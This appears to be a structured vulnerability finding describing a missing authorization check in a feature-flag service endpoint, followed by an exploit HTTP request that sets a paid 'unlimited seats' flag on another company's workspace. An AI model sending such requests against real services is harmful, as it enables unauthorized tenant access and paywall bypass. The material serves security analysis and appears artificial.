diagnosis: The endpoint adds user targeting rules to a feature flag in the feature flag service using target_workspace_id from the payload. It does not verify that current_user has administrator privileges in target_workspace_id, allowing any authenticated user to toggle beta features or bypass paywalls for other workspaces.
exploit_request:
POST /features/ai_unlimited_seats/targets HTTP/1.1
Host: flags.saasmgmt.io
Authorization: Bearer <unauthorized_user_jwt>
Content-Type: application/json

{"target_workspace_id": "ws_target_corp_99", "user_key": "usr_attacker_99", "desired_variation": true}
